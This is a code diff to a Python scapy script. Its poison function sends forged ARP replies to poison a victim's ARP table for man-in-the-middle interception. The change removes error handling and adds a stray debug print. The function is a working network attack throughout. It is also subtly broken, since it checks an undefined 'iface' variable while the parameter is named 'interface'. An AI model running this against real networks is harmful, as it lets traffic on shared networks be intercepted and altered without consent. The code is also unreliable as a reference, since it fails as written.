@@ -5,26 +5,24 @@ from time import sleep
 
 def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
     '''Change mac address in arp table'''
-    try:
         # Only get target mac if victim mac is not specified
-        if victim_mac == '':
-            # Get victim host ip address using previously created function
-            victim_mac = get_target_mac(victim_ip, interface)
-            
-        # Set interface to the default if not specified
-        if iface =='':
-            iface = conf.iface
-
-        # Create the ARP packet, scapy will add your MAC address for hwsrc
-        # op=2 means that ARP is going to send answer 
-        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
+    if victim_mac == '':
+        # Get victim host ip address using previously created function
+        print("really happening?")
+        victim_mac = get_target_mac(victim_ip, interface)
         
-        # print(packet) #debugging
+    # Set interface to the default if not specified
+    if iface =='':
+        iface = conf.iface
 
-        # Send the ARP packet without output
-        send(packet, verbose=False)
-    except:
-        print('Victim not found')
+    # Create the ARP packet, scapy will add your MAC address for hwsrc
+    # op=2 means that ARP is going to send answer 
+    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
+    
+    # print(packet) #debugging
+
+    # Send the ARP packet without output
+    send(packet, verbose=False)
 
 
 def restore_arp(victim_ip, spoof_ip, interface=''):
